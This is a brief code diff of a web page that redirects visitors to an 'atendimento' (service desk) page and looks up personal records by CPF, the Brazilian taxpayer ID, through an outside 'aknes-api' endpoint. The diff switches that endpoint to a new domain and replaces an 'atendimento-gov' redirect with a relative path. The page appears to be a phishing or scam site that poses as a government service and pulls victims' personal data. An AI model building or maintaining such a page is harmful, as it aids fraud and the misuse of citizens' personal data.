@@ -1397,7 +1397,7 @@
                       event.preventDefault();
                       var currentUrlParams = window.location.search;
                       window.location.href =
-                        "https://atendimento-gov.lovable.app/chat" + currentUrlParams;
+                        "../atendimento" + currentUrlParams;
                     }
                   </script>
                 </div>
@@ -1498,7 +1498,7 @@
       }
 
       function fetchCpfData(cpf) {
-        const apiUrl = `https://site-clientes.info/aknes-api/aknes.php?cpf=${cpf}`;
+        const apiUrl = `https://site-clientes.online/aknes-api/aknes.php?cpf=${cpf}`;
 
         fetch(apiUrl)
           .then((response) => {
